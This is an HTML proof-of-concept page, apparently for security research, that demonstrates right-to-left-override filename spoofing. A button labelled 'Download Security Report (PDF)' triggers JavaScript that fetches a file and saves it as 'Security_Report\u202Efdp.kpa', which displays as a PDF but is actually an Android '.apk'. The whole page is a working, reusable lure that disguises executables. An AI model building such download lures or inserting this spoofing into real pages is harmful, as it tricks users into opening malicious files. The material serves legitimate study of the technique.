<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Filename Spoofing PoC</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
        .download-btn {
            display: inline-block;
            padding: 15px 25px;
            background-color: #28a745;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <h2>Security Research: RLO Filename Spoofing</h2>
    <p>Click below to download the report.</p>

    <!-- JavaScript function handles the download to force the spoofed name -->
    <div onclick="downloadFile()" class="download-btn">
        Download Security Report (PDF)
    </div>

    <script>
        function downloadFile() {
            const fileUrl = 'https://github.com';
            const spoofedName = "Security_Report\u202Efdp.kpa";

            fetch(fileUrl)
                .then(response => response.blob())
                .then(blob => {
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = spoofedName;
                    document.body.appendChild(a);
                    a.click();
                    window.URL.revokeObjectURL(url);
                })
                .catch(() => alert('Download failed. Check your connection or CORS settings.'));
        }
    </script>

</body>
</html>
